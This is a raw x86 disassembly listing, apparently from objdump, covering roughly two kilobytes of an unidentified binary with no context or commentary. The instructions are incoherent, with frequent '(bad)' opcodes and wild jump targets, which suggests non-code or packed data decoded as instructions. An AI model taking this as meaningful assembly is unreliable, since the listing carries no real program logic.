  440eb0:	ror    BYTE PTR [edi-0x1a82c9b7],0x8d
  440eb7:	test   DWORD PTR [ebx],0x7460b362
  440ebd:	cmc    
  440ebe:	jecxz  0x440ea9
  440ec0:	add    ecx,DWORD PTR [eax]
  440ec2:	scas   al,BYTE PTR es:[edi]
  440ec3:	jb     0x440eee
  440ec5:	cmp    BYTE PTR [esi],dl
  440ec7:	fidivr WORD PTR [ecx-0x25]
  440eca:	stc    
  440ecb:	and    al,ah
  440ecd:	(bad)  
  440ece:	fist   DWORD PTR [esi-0x222c3168]
  440ed4:	add    esp,DWORD PTR [edx-0x72]
  440ed7:	stc    
  440ed8:	add    esp,DWORD PTR [edx-0x27]
  440edb:	add    cl,BYTE PTR [esi-0x1c]
  440ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440edf:	inc    ecx
  440ee0:	jg     0x440ef2
  440ee2:	loope  0x440ee6
  440ee4:	aas    
  440ee5:	fstp   TBYTE PTR [eax-0x710e8522]
  440eeb:	fld    QWORD PTR [edi]
  440eed:	(bad)  
  440eee:	fnstenv [eax-0x27]
  440ef1:	xor    eax,0xe6263ab3
  440ef6:	mov    al,ds:0x695ca9e1
  440efb:	push   ecx
  440efc:	sbb    ah,BYTE PTR [edx-0x27]
  440eff:	out    dx,al
  440f00:	jns    0x440ecf
  440f02:	nop
  440f03:	iret   
  440f04:	add    eax,DWORD PTR [eax]
  440f06:	bound  ebx,QWORD PTR [esi+0x0]
  440f09:	cdq    
  440f0a:	ins    DWORD PTR es:[edi],dx
  440f0b:	popa   
  440f0c:	adc    al,0xd8
  440f0e:	push   eax
  440f0f:	or     cl,BYTE PTR ds:0xb9628bf6
  440f15:	mul    DWORD PTR [ecx-0x27]
  440f18:	mov    esp,DWORD PTR [ecx]
  440f1a:	pop    edx
  440f1b:	push   esp
  440f1c:	push   eax
  440f1d:	loope  0x440f88
  440f1f:	out    dx,al
  440f20:	adc    DWORD PTR [edx-0x2f],esi
  440f23:	lea    ecx,[esi]
  440f25:	jmp    0xb999638b
  440f2a:	nop
  440f2b:	or     cl,BYTE PTR ds:0xcaf37178
  440f31:	cvtps2pi mm6,QWORD PTR ds:0x5f8e2c8b
  440f38:	dec    esp
  440f39:	jecxz  0x440fac
  440f3b:	push   ebx
  440f3c:	nop
  440f3d:	dec    ebp
  440f3e:	dec    ebx
  440f3f:	fld    DWORD PTR [eax]
  440f41:	(bad)  
  440f43:	bound  edi,QWORD PTR [eax-0x14269e29]
  440f49:	ror    bl,cl
  440f4b:	push   esp
  440f4c:	mov    WORD PTR [ebx],?
  440f4e:	gs aad 0x0
  440f51:	jmp    0xc8262c11
  440f56:	jle    0x440fb1
  440f58:	mov    eax,0x3d961ff
  440f5d:	pushf  
  440f5e:	cmp    DWORD PTR [ebx-0x78],edx
  440f61:	test   DWORD PTR [ebx-0x27],ecx
  440f64:	add    BYTE PTR [edx+0x6d],dh
  440f67:	test   al,bl
  440f69:	stos   DWORD PTR es:[edi],eax
  440f6a:	add    BYTE PTR [ecx],ah
  440f6c:	dec    ecx
  440f6d:	mov    dl,BYTE PTR [ebp+edi*2-0x25e6aaa1]
  440f74:	sub    eax,0xd1ca36c
  440f79:	mov    dh,0xc9
  440f7b:	cmc    
  440f7c:	or     BYTE PTR [ecx],al
  440f7e:	bound  ebp,QWORD PTR [ecx+0x3b000e84]
  440f84:	fnstsw WORD PTR [ecx+0xdd0b10]
  440f8a:	sub    edx,DWORD PTR [eax]
  440f8c:	aaa    
  440f8d:	enter  0xeb7e,0x72
  440f91:	jl     0x440f91
  440f93:	xchg   ebp,eax
  440f94:	scas   al,BYTE PTR es:[edi]
  440f95:	loopne 0x440f22
  440f97:	xor    eax,DWORD PTR [ebp+0x61]
  440f9a:	or     ebx,edx
  440f9c:	mov    ch,0x11
  440f9e:	add    bl,bh
  440fa0:	fnstenv [edx+0xe3e398]
  440fa6:	add    BYTE PTR [eax+0x75],dl
  440fa9:	adc    ecx,DWORD PTR [eax+0x40f833af]
  440faf:	mov    bh,0xd9
  440fb1:	mov    dl,0x98
  440fb3:	inc    edx
  440fb4:	jecxz  0x440fb6
  440fb6:	add    BYTE PTR [eax],dh
  440fb8:	test   edi,edi
  440fba:	mov    dl,BYTE PTR [ebx-0x1f]
  440fbd:	mov    BYTE PTR [esp+ecx*4],bl
  440fc0:	lds    ecx,FWORD PTR [edi+0xdc85bc]
  440fc6:	dec    DWORD PTR [ebx-0x1f]
  440fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440fca:	adc    BYTE PTR [ecx+0xd36205],ah
  440fd0:	or     eax,0xef04ac6
  440fd5:	sbb    esp,edi
  440fd7:	out    dx,eax
  440fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440fd9:	ret    
  440fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440fdb:	mov    eax,0xeb00dc75
  440fe0:	(bad)  
  440fe1:	jb     0x440fa7
  440fe3:	out    0x95,al
  440fe5:	inc    ebx
  440fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440fe7:	mov    eax,0x300dc35
  440fec:	add    ah,0x7f
  440fef:	mov    esp,0x4a00dc35
  440ff4:	shl    BYTE PTR [eax],cl
  440ff6:	sti    
  440ff7:	add    DWORD PTR [ecx+0x62fff7dd],0x5d06ac32
  441001:	mov    al,0x6e
  441003:	pop    ds
  441004:	fwait
  441005:	jb     0x44100a
  441007:	in     eax,0x6e
  441009:	retf   
  44100a:	ss mov esi,0xb200370b
  441010:	rcl    DWORD PTR [ecx],cl
  441012:	mov    ch,0x3f
  441014:	(bad)  
  441015:	retf   
  441016:	mov    dh,0xb
  441018:	ins    DWORD PTR es:[edi],dx
  441019:	outs   dx,DWORD PTR ds:[esi]
  44101a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44101b:	scas   al,BYTE PTR es:[edi]
  44101c:	pusha  
  44101d:	mov    ebx,0x3254bb7b
  441022:	add    esi,DWORD PTR [ebp+0x33252]
  441028:	mov    DWORD PTR [edi+0x7a],esp
  44102b:	jp     0x440fff
  44102d:	dec    edx
  44102e:	xor    al,0x79
  441030:	inc    edx
  441031:	mov    ebx,0x55000bce
  441036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441037:	out    0xad,eax
  441039:	inc    esp
  44103a:	retf   
  44103b:	pop    eax
  44103c:	popa   
  44103d:	xchg   ecx,eax
  44103e:	push   ebx
  44103f:	je     0x441088
  441041:	pop    edx
  441042:	loopne 0x44103f
  441044:	(bad)
  441048:	add    BYTE PTR [ebp+0x10],ch
  44104b:	mov    WORD PTR [edi-0x7afccd94],?
  441051:	xor    ch,BYTE PTR [esi]
  441053:	jnp    0x441070
  441055:	jae    0x441016
  441057:	ret    
  441058:	adc    ebp,ecx
  44105a:	mov    DWORD PTR [edi],ecx
  44105c:	or     DWORD PTR [ecx+ecx*8+0x3262116a],ebp
  441063:	je     0x4410b4
  441065:	pop    edx
  441066:	retf   0xf07
  441069:	jmp    0x6255780e
  44106e:	xor    BYTE PTR [eax],dh
  441070:	aas    
  441071:	jbe    0x441034
  441073:	adc    esp,DWORD PTR [esi]
  441075:	sbb    dl,bl
  441077:	xchg   DWORD PTR [edx+ecx*2+0x53],edx
  44107b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44107c:	xor    ebp,eax
  44107e:	lods   eax,DWORD PTR ds:[esi]
  44107f:	jecxz  0x4410b4
  441081:	in     al,0x69
  441083:	inc    ebp
  441084:	sbb    DWORD PTR [edx-0x27],esp
  441087:	jb     0x44105f
  441089:	sbb    eax,eax
  44108b:	jo     0x4410f8
  44108d:	int    0xef
  44108f:	jmp    0x63251797
  441094:	into   
  441095:	pop    ecx
  441096:	mov    edi,0xcf001072
  44109b:	mov    edi,0xd08323ba
  4410a0:	jno    0x44110e
  4410a2:	push   ebx
  4410a3:	fldl2t 
  4410a5:	add    bl,BYTE PTR [ebx]
  4410a7:	push   ecx
  4410a8:	jno    0x44111a
  4410aa:	jae    0x441085
  4410ac:	jmp    0x49d0aa2b
  4410b1:	ret    
  4410b2:	(bad)  
  4410b3:	fldenv [edx-0x2f]
  4410b6:	pop    ebp
  4410b7:	pop    esp
  4410b8:	sahf   
  4410b9:	jmp    ecx
  4410bb:	pop    esi
  4410bc:	xchg   esp,eax
  4410bd:	das    
  4410be:	mov    edx,0xd578f5f2
  4410c3:	xchg   ebp,eax
  4410c4:	sub    DWORD PTR [edi+ebx*8],eax
  4410c7:	push   ecx
  4410c8:	cmp    eax,0x37d96216
  4410cd:	adc    al,0x62
  4410cf:	fldl2t 
  4410d1:	ficom  DWORD PTR [edx-0x240067fe]
  4410d7:	mov    al,ds:0xbf7a2f5c
  4410dc:	jb     0x441110
  4410de:	add    ebp,DWORD PTR [edx]
  4410e0:	inc    edi
  4410e1:	jnp    0x441108
  4410e3:	sar    DWORD PTR [edi-0x287e4a04],1
  4410e9:	add    esp,DWORD PTR [edx-0x2a]
  4410ec:	outs   dx,DWORD PTR ds:[esi]
  4410ed:	mov    WORD PTR ds:0x61e900ef,cs
  4410f3:	pop    esp
  4410f4:	jo     0x4410cb
  4410f6:	leave  
  4410f7:	loop   0x44112a
  4410f9:	es es jmp 0xe8e:0xe6005707
  441102:	jmp    0xf5b46d68
  441107:	test   al,0x9e
  441109:	or     BYTE PTR [ecx+0x72],dh
  44110c:	ror    DWORD PTR [ebx+0xe89261],cl
  441112:	jmp    0x38511753
  441117:	outs   dx,BYTE PTR ds:[esi]
  441118:	dec    ebx
  44111a:	dec    edi
  44111b:	xchg   ecx,eax
  44111c:	cmp    al,0x5e
  44111e:	jo     0x4410f1
  441120:	lea    ecx,[esi]
  441122:	jmp    0x12906388
  441127:	cs pop ebp
  441129:	push   ebp
  44112a:	icebp  
  44112b:	pop    esi
  44112c:	push   esi
  44112d:	mov    ah,0xd7
  44112f:	popa   
  441130:	fldl2t 
  441132:	fist   DWORD PTR [edx+0x4947f741]
  441138:	push   ebp
  441139:	add    ch,ch
  44113b:	popa   
  44113c:	fstp   DWORD PTR [esi-0x46]
  44113f:	cmp    DWORD PTR [eax-0x17c686f7],0x0
  441146:	jmp    0x279b21ab
  44114b:	pop    ds
  44114c:	pop    esi
  44114d:	mov    ah,0xd7
  44114f:	popa   
  441150:	fstp   DWORD PTR [ebx+0x62]
  441153:	cmp    ah,BYTE PTR [ebx+0x12459dc3]
  441159:	les    esi,FWORD PTR ds:0x2dc4123d
  44115f:	xor    eax,0x93c412
  441164:	mov    esp,0x705af785
  441169:	test   DWORD PTR [ebp-0x8932b00],eax
  44116f:	dec    DWORD PTR [ebx+0x5a]
  441172:	add    BYTE PTR ds:[ebp+0x3d73f69a],cl
  441179:	jg     0x4411ef
  44117b:	cmp    DWORD PTR [ebx-0x7e],ecx
  44117e:	inc    ecx
  44117f:	inc    eax
  441180:	enter  0x39d,0xd1
  441184:	popa   
  441185:	push   edi
  441186:	out    dx,eax
  441187:	pop    ds
  441188:	aad    0xe2
  44118a:	popa   
  44118b:	and    DWORD PTR [ebp+0xbfff7b0],0xffffffd9
  441192:	jae    0x4411c8
  441194:	fst    QWORD PTR [edi-0x47]
  441197:	mov    esp,0xd8fb
  44119c:	sahf   
  44119d:	pop    ds
  44119e:	popa   
  44119f:	adc    ebp,0x5
  4411a2:	clc    
  4411a3:	(bad)  
  4411a4:	sti    
  4411a5:	fdiv   DWORD PTR [ebx+0x20]
  4411a8:	sar    DWORD PTR ds:0xc3cbfff7,cl
  4411ae:	mov    DWORD PTR [edx+ecx*8],edx
  4411b1:	fadd   DWORD PTR [eax]
  4411b3:	nop
  4411b4:	sbb    eax,0x8e002e5a
  4411b9:	inc    ebx
  4411ba:	aaa    
  4411bb:	or     DWORD PTR [edx],0xffffffd2
  4411be:	cmp    eax,DWORD PTR [eax]
  4411c0:	retf   0xd8
  4411c3:	jl     0x4411a9
  4411c5:	dec    edx
  4411c6:	mov    bh,0xc3
  4411c8:	add    BYTE PTR [ebx],dl
  4411ca:	fadd   DWORD PTR [eax]
  4411cc:	add    BYTE PTR [ebx-0x38333467],cl
  4411d2:	cdq    
  4411d3:	retf   
  4411d4:	int3   
  4411d5:	enter  0x5198,0x8b
  4411d9:	or     bl,BYTE PTR [edx-0x1f]
  4411dc:	add    DWORD PTR [eax-0x62],esi
  4411df:	cmp    eax,0xc0da12d1
  4411e4:	test   DWORD PTR [edx+0x0],esp
  4411e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4411e8:	out    dx,eax
  4411e9:	xchg   ebx,eax
  4411ea:	call   0xcb41:0xe2ebcc6
  4411f1:	test   BYTE PTR es:[eax-0x35],0x1e
  4411f6:	mov    bh,0x74
  4411f8:	mov    ebx,0x4d03326c
  4411fd:	loope  0x4411f7
  4411ff:	or     al,0x73
  441201:	ins    DWORD PTR es:[edi],dx
  441202:	xor    ebp,DWORD PTR [ebp-0x69]
  441205:	jmp    0xf81:0xd9000343
  44120c:	test   DWORD PTR [edx+0x731b7b4a],ebp
  441212:	inc    ebx
  441213:	ret    
  441214:	adc    ebx,DWORD PTR [ebp+0x4]
  441217:	test   DWORD PTR [esi-0x7afccd94],esi
  44121d:	stos   BYTE PTR es:[edi],al
  44121e:	inc    esi
  44121f:	js     0x441270
  441221:	push   0xffffffca
  441223:	pop    es
  441224:	paddsw mm6,mm1
  441227:	sbb    BYTE PTR ds:0x877b9c1b,ch
  44122d:	add    BYTE PTR [edx],bl
  44122f:	and    al,0x3
  441231:	add    bl,ch
  441233:	leave  
  441234:	adc    DWORD PTR [bp+si+0x32],esp
  441238:	enter  0xe1bc,0x88
  44123c:	sti    
  44123d:	jnp    0x4411c4
  44123f:	(bad)  
  441240:	rol    DWORD PTR [edi],cl
  441242:	jmp    0xcaca2b50
  441247:	test   eax,0xba62000d
  44124c:	pop    es
  44124d:	push   es
  44124e:	ins    DWORD PTR es:[edi],dx
  44124f:	add    al,0x94
  441251:	mov    dh,0x6c
  441253:	xor    al,BYTE PTR [ebx]
  441255:	stc    
  441256:	and    ah,BYTE PTR [esi]
  441258:	cmp    BYTE PTR [edi-0x3a],0x2b
  44125c:	add    eax,DWORD PTR [eax]
  44125e:	jp     0x441238
  441260:	(bad)  
  441261:	jp     0x441248
  441263:	sub    bh,0x3
  441266:	bound  esp,QWORD PTR [eax+0x14993f2a]
  44126c:	adc    eax,0x2d16293f
  441271:	aas    
  441272:	sub    DWORD PTR [esi],edx
  441274:	and    eax,0x6216193f
  441279:	jnp    0x441284
  44127b:	in     al,dx
  44127c:	jmp    0x209ac184
  441281:	sti    
  441282:	mov    ebx,0xd575e6f7
  441287:	xor    edi,0xb94e6203
  44128d:	pop    ss
  44128e:	out    0x91,eax
  441290:	icebp  
  441291:	jnp    0x441293
  441293:	jns    0x44127d
  441295:	test   dl,0x71
  441298:	dec    esi
  441299:	mov    eax,ds:0xe1a9df17
  44129e:	cld    
  44129f:	mov    bl,0x61
  4412a1:	mov    al,ds:0xd2d96212
  4412a6:	adc    al,0xe1
  4412a8:	adc    BYTE PTR [edi+0x16],cl
  4412ab:	fist   WORD PTR [ecx-0x12d2811f]
  4412b1:	jae    0x44123f
  4412b3:	or     eax,0xda03e9ec
  4412b8:	in     eax,0xd8
  4412ba:	sub    al,BYTE PTR [ebp+0x433cfaed]
  4412c0:	push   eax
  4412c1:	jno    0x44132f
  4412c3:	push   ebx
  4412c4:	fldl2t 
  4412c6:	jl     0x4412ad
  4412c8:	test   edi,esi
  4412ca:	add    esp,DWORD PTR [edx-0x62]
  4412cd:	stos   BYTE PTR es:[edi],al
  4412ce:	cmp    BYTE PTR [ecx-0x56c752eb],ch
  4412d4:	adc    eax,0x159938a5
  4412d9:	add    BYTE PTR [eax*1-0x2e8acd2],bl
  4412e0:	sub    cl,BYTE PTR [ebx-0x8aba9a5]
  4412e6:	pop    esi
  4412e7:	cmp    ebp,eax
  4412e9:	jne    0x4412cc
  4412eb:	popa   
  4412ec:	int    0x42
  4412ee:	bound  ebx,QWORD PTR [esi]
  4412f0:	out    0x8b,al
  4412f2:	cdq    
  4412f3:	pop    ecx
  4412f4:	pop    edx
  4412f5:	adc    al,0xd8
  4412f7:	add    BYTE PTR [eax+0x2],bh
  4412fa:	or     eax,0x4fda2e62
  4412ff:	bound  ecx,QWORD PTR [esi]
  441301:	out    0x8b,al
  441303:	xor    bl,BYTE PTR [edi+0x2a71083b]
  441309:	jmp    0x5c99bd05
  44130e:	js     0x441305
  441310:	pushf  
  441311:	xchg   edx,eax
  441312:	or     BYTE PTR [ebx+0x55],dh
  441315:	dec    eax
  441316:	shl    DWORD PTR [ecx+0xa],1
  441319:	jmp    0x5c99bd15
  44131e:	js     0x4412f5
  441320:	jl     0x4412b4
  441322:	or     BYTE PTR [edx+0x34],dh
  441325:	dec    ecx
  441326:	shr    DWORD PTR [eax-0x1a7725b2],1
  44132c:	push   eax
  44132d:	inc    eax
  44132e:	inc    eax
  44132f:	cmc    
  441330:	test   al,0x56
  441332:	fstp   TBYTE PTR ds:0xe99b4ebe
  441338:	popa   
  441339:	fld    DWORD PTR [eax]
  44133b:	bound  ecx,QWORD PTR [ecx]
  44133d:	out    0x8b,al
  44133f:	sbb    DWORD PTR [esi-0x49bb7664],edi
  441345:	pop    ebx
  441346:	push   ss
  441347:	jno    0x4413ae
  441349:	ror    BYTE PTR [ebx+0x4040a634],cl
  44134f:	cmc    
  441350:	mov    ds:0x9600db56,eax
  441355:	neg    DWORD PTR [ecx+0x5b]
  441358:	outs   dx,BYTE PTR ds:[esi]
  441359:	call   0xebc2:0x6600cccb
  441360:	mov    edx,DWORD PTR [esi+0x45]
  441363:	mov    al,BYTE PTR [edx+0xd5f7]
  441369:	inc    bl
  44136b:	jg     0x441376
  44136d:	jnp    0x441344
  44136f:	jg     0x4412f3
  441371:	push   ebx
  441372:	inc    eax
  441373:	idiv   edi
  441375:	sar    BYTE PTR [esi-0x22c4f4dd],cl
  44137b:	and    eax,0x7b56bec9
  441380:	or     cl,BYTE PTR [ebx-0x23]
  441383:	rol    DWORD PTR [edx-0x8bfd5],0x3b
  44138a:	jge    0x4413cf
  44138c:	add    BYTE PTR [esi+edx*2+0x2b],dh
  441390:	or     ecx,DWORD PTR [ebx]
  441392:	fisttp QWORD PTR [eax+eiz*2]
  441395:	(bad)  
  441396:	fdivr  QWORD PTR [edi-0x7e]
  441399:	retf   
  44139a:	aas    
  44139b:	idiv   edi
  44139d:	xor    al,0x56
  44139f:	das    
  4413a0:	or     ecx,DWORD PTR [ebx]
  4413a2:	(bad)  [eax]
  4413a4:	pusha  
  4413a5:	inc    edi
  4413a6:	aad    0x62
  4413a8:	mov    DWORD PTR [ecx-0x53],esi
  4413ab:	adc    DWORD PTR [eax],eax
  4413ad:	sti    
  4413ae:	ret    
  4413af:	jge    0x44136d
  4413b1:	aad    0xdc
  4413b3:	add    BYTE PTR [ebp-0x4e],bl
  4413b6:	xchg   esi,eax
  4413b7:	jmp    0x66cc:0xcc020cff
  4413be:	mov    esi,0xff0083eb
  4413c3:	xor    eax,0xf7568d51
  4413c8:	and    al,0xc9
  4413ca:	inc    ebx
  4413cb:	fadd   QWORD PTR [eax]
  4413cd:	add    BYTE PTR [edx+0x32],ah
  4413d0:	aam    0xd1
  4413d2:	out    dx,eax
  4413d3:	es mov ebp,0xe63ee961
  4413d9:	fild   WORD PTR [ebx+esi*1]
  4413dc:	xor    ah,BYTE PTR [ecx+0x61]
  4413df:	sar    cl,0xb0
  4413e2:	lods   al,BYTE PTR ds:[esi]
  4413e3:	fdivr  DWORD PTR [ebx+0x4b]
  4413e6:	pop    ds
  4413e7:	xchg   edx,eax
  4413e8:	mov    esp,0xa92f6a7c
  4413ed:	jecxz  0x441420
  4413ef:	mov    al,ds:0xd6dad477
  4413f4:	stc    
  4413f5:	mov    al,0xae
  4413f7:	mov    edi,0x863082fe
  4413fc:	adc    DWORD PTR [ecx],ecx
  4413fe:	or     eax,0xe9dfc66e
  441403:	stc    
  441404:	mov    esp,0xc66deb61
  441409:	fistp  QWORD PTR [edx]
  44140b:	add    ah,BYTE PTR [eax]
  44140d:	clc    
  44140e:	and    eax,0xd5037a50
  441413:	ja     0x4413f9
  441415:	in     al,dx
  441416:	xchg   esp,eax
  441417:	test   dl,0x84
  44141a:	pop    es
  44141b:	pop    ebp
  44141c:	cmp    al,0xcb
  44141e:	push   ss
  44141f:	pop    ebp
  441420:	je     0x44140d
  441422:	loope  0x441461
  441424:	sti    
  441425:	test   BYTE PTR [eax],al
  441427:	lahf   
  441428:	dec    edx
  441429:	int3   
  44142a:	push   eax
  44142b:	fyl2xp1 
  44142d:	jne    0x44146e
  44142f:	pop    edx
  441430:	mov    ebx,0x49e90bd3
  441435:	jl     0x4413fd
  441437:	aad    0x42
  441439:	inc    ebx
  44143a:	xchg   BYTE PTR [edi],dh
  44143c:	sbb    bh,BYTE PTR [edx+0x4a]
  44143f:	(bad)  
  441440:	outs   dx,BYTE PTR ds:[esi]
  441441:	or     DWORD PTR [edi+0x56],0x62000332
  441448:	fldl2t 
  44144a:	add    esp,DWORD PTR [ebx+0x62102d56]
  441450:	fxch   st(4)
  441452:	add    eax,0x555cd962
  441457:	sbb    eax,DWORD PTR [edi]
  441459:	or     BYTE PTR [ebp-0x5016a7b7],al
  44145f:	addr16 inc eax
  441461:	rcl    DWORD PTR [bx+di-0x27],cl
  441465:	jmp    0xf5ece7e6
  44146a:	add    esp,DWORD PTR [edx+0x52]
  44146d:	pop    ebp
  44146e:	xchg   ecx,eax
  44146f:	or     esp,edx
  441471:	jmp    0x45d8f979
  441476:	inc    ecx
  441477:	loope  0x441482
  441479:	mov    ds:0xe9d9620f,al
  44147e:	jl     0x44149d
  441480:	xor    esp,esi
  441482:	hlt    
  441483:	das    
  441484:	mov    eax,0xdbe2cf60
  441489:	test   eax,0x41a000ec
  44148e:	xchg   ebp,eax
  44148f:	cmp    eax,0xfb97fa6
  441494:	(bad)  
  441495:	fldpi  
  441497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441499:	pop    edx
  44149a:	add    BYTE PTR ds:0x7ca8d489,al
  4414a0:	les    esi,FWORD PTR [edx]
  4414a2:	jmp    0x441498
  4414a4:	mov    ebp,0x51d35f3e
  4414a9:	fldl2t 
  4414ab:	jp     0x441480
  4414ad:	test   eax,0x506203ed
  4414b2:	mov    ?,WORD PTR gs:[ecx]
  4414b5:	shr    cl,cl
  4414b7:	add    ecx,DWORD PTR [ecx+ebx*8]
  4414ba:	jmp    0x70fb76c2
  4414bf:	adc    bl,ah
  4414c1:	pop    ss
  4414c2:	add    BYTE PTR [ebp-0x44],ch
  4414c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4414c6:	or     al,0xe9
  4414c8:	popa   
  4414c9:	fincstp 
  4414cb:	ja     0x4414db
  4414cd:	call   0x2626fdd2
  4414d2:	ins    BYTE PTR es:[edi],dx
  4414d3:	loop   0x441469
  4414d5:	mov    DWORD PTR [edx+ebp*2],edi
  4414d8:	pusha  
  4414d9:	idiv   BYTE PTR [esi+0x55]
  4414dc:	pop    esp
  4414dd:	fld    DWORD PTR [eax]
  4414df:	push   0xfffffffc
  4414e1:	lea    ecx,[ecx+ebp*8]
  4414e4:	popa   
  4414e5:	aas    
  4414e6:	jnp    0x441523
  4414e8:	not    DWORD PTR [edx-0x296c8d0c]
  4414ee:	mov    DWORD PTR [ebx+0x7e556500],esi
  4414f4:	mov    ecx,0x7000d96d
  4414f9:	cmp    DWORD PTR [ebx+ecx*4+0x21],edi
  4414fd:	mov    bh,0x45
  4414ff:	add    DWORD PTR [edx+0x5f],0xffffffbd
  441503:	adc    DWORD PTR [edx+0x31e818b8],ebx
  441509:	pop    edx
  44150a:	inc    ecx
  44150b:	div    DWORD PTR [edx+0x69fc19e0]
  441511:	jns    0x441552
  441513:	je     0x44151b
  441515:	cdq    
  441516:	fwait
  441517:	clc    
  441518:	pusha  
  441519:	and    eax,DWORD PTR [esi-0x15]
  44151c:	out    dx,al
  44151d:	mov    bh,BYTE PTR [edx+0x1c]
  441520:	jmp    0x6244ee86
  441525:	jl     0x4414b5
  441527:	or     al,0xe9
  441529:	popa   
  44152a:	push   esp
  44152b:	test   BYTE PTR [edi+0x25],ch
  44152e:	aad    0x0
  441530:	jmp    0xe2a4759d
  441535:	popa   
  441536:	(bad)  [eax+0x60]
  441539:	push   edi
  44153a:	mov    cs,WORD PTR [eax+eax*1]
  44153d:	mov    ebx,0x50015ed9
  441542:	cld    
  441543:	jle    0x4414d3
  441545:	sub    eax,DWORD PTR [edx-0x9]
  441548:	jmp    DWORD PTR [ebx+0x4ffebae]
  44154e:	ret    
  44154f:	and    DWORD PTR [eax-0x50],0x8300d9
  441556:	shl    esi,0xf6
  441559:	xchg   ebp,eax
  44155a:	dec    edi
  44155b:	jmp    0xc4541560
  441560:	push   ebx
  441561:	adc    al,0x7b
  441563:	fnstcw WORD PTR [edi-0x64]
  441566:	add    eax,0x8bfffc16
  44156b:	aam    0x92
  44156d:	push   esp
  44156e:	outs   dx,DWORD PTR ds:[esi]
  44156f:	fld    DWORD PTR [eax]
  441571:	mov    esi,ebp
  441573:	or     eax,0xbe4b0013
  441578:	or     DWORD PTR [esi-0x8bff9],0x1d
  44157f:	rcl    BYTE PTR [ebx],0x87
  441582:	sbb    eax,0xc09f0cd8
  441587:	sub    edi,0x89ccc266
  44158d:	mov    ch,BYTE PTR [edi+0x3b1458d6]
  441593:	fnstcw WORD PTR [esi-0x74]
  441596:	or     eax,0xb001311
  44159b:	pop    eax
  44159c:	ret    
  44159d:	add    al,0x21
  44159f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4415a0:	or     BYTE PTR [esi+0xef48769],dh
  4415a6:	cmp    eax,0xf34d7ca5
  4415ab:	cmc    
  4415ac:	mov    ch,0x88
  4415ae:	outs   dx,DWORD PTR ds:[esi]
  4415af:	inc    ebx
  4415b0:	dec    edi
  4415b1:	adc    al,0xfb
  4415b3:	fmul   DWORD PTR [ecx]
  4415b5:	mov    bh,0x62
  4415b7:	adc    DWORD PTR [esi-0x4cd1ff7a],0xdedb6202
  4415c1:	jge    0x4415c0
  4415c3:	fisubr DWORD PTR [esp+ebx*4-0x3dcd9dfc]
  4415ca:	arpl   WORD PTR gs:[edi+0x7a1f8636],si
  4415d1:	adc    al,0x2d
  4415d3:	mov    dh,0x5b
  4415d5:	sbb    eax,0x802ea67c
  4415da:	mov    ecx,0x34632
  4415df:	pusha  
  4415e0:	inc    ebx
  4415e1:	outs   dx,BYTE PTR ds:[esi]
  4415e2:	cmp    eax,0xf81dbb85
  4415e7:	in     al,dx
  4415e8:	ficom  WORD PTR [eax]
  4415ea:	add    BYTE PTR [edx-0x49],ah
  4415ed:	jbe    0x441642
  4415ef:	push   esi
  4415f0:	xor    al,BYTE PTR [ebx]
  4415f2:	test   esp,ecx
  4415f4:	adc    bh,al
  4415f6:	call   FWORD PTR [ebp-0x49]
  4415f9:	scas   eax,DWORD PTR es:[edi]
  4415fa:	pop    es
  4415fb:	jmp    0x4415c2
  4415fd:	jbe    0x44165a
  4415ff:	pop    ecx
  441600:	xor    al,BYTE PTR [ebx]
  441602:	test   DWORD PTR [edx+ebp*4],ebx
  441605:	cmp    eax,0x7a033deb
  44160a:	pop    edx
  44160b:	ss popf 
  44160d:	xchg   BYTE PTR [ebx],bh
  44160f:	pop    ecx
  441610:	xor    al,BYTE PTR [ebx]
  441612:	call   0xf861f30a
  441617:	mov    ebp,0xb7e27887
  44161c:	out    dx,eax
  44161d:	cmp    bl,cl
  44161f:	add    BYTE PTR [esi],bl
  441621:	push   es
  441622:	cmp    ebx,ecx
  441624:	push   ss
  441625:	out    dx,al
  441626:	cmp    bl,cl
  441628:	cs pop esp
  44162a:	js     0x44161b
  44162c:	jmp    0x62491ee4
  441631:	fldl2t 
  441633:	jbe    0x441610
  441635:	fs jmp 0xc1e7783e
  44163b:	pop    eax
  44163c:	retf   
  44163d:	cmp    eax,esi
  44163f:	js     0x441624
  441641:	lock repnz add esp,DWORD PTR [edx+0x4e]
  441646:	addr16 jnp 0x4416ad
  441649:	fldl2t 
  44164b:	int    0xbd
  44164d:	popa   
  44164e:	mov    bh,0x24
  441650:	stos   BYTE PTR es:[edi],al
  441651:	dec    ebp
  441652:	addr16 repz pop esi
  441655:	fldl2t 
  441657:	rol    DWORD PTR [ebp-0x65db73f3],cl
  44165d:	push   edi
  44165e:	popf   
  44165f:	not    ebp
  441661:	out    0xe9,al
  441663:	add    esp,DWORD PTR [edx+0x30]
  441666:	jmp    0xdd6d:0xded92476
  44166d:	mov    WORD PTR [edx],gs
  44166f:	les    ebp,FWORD PTR [ebp-0x4b]
  441672:	push   0x67
  441674:	fstp   TBYTE PTR [edx-0x269dfc0d]
  44167a:	aam    0x9a
  44167c:	push   0xffffff83
  44167e:	jns    0x441638
  441680:	mov    ds,WORD PTR [ecx-0x39ff6217]
  441686:	jge    0x4416d7
  441688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441689:	addr16 fldl2t 
  44168c:	add    esi,DWORD PTR [ecx-0x1a9228ff]
  441692:	(bad)
  441696:	mov    ch,0x6a
  441698:	addr16 jmp 0x441656
  44169b:	jecxz  0x4416a0
  44169d:	(bad)  
  44169e:	(bad)  [eax+esi*8-0x45a67ca6]
  4416a5:	inc    esi
  4416a6:	cdq    
  4416a7:	jmp    0xc19549
  4416ac:	pop    edi
  4416ad:	mov    edi,0x61e900d4
  4416b2:	(bad)  
  4416b3:	xor    BYTE PTR [edx+0x36],ch
  4416b6:	(bad)  
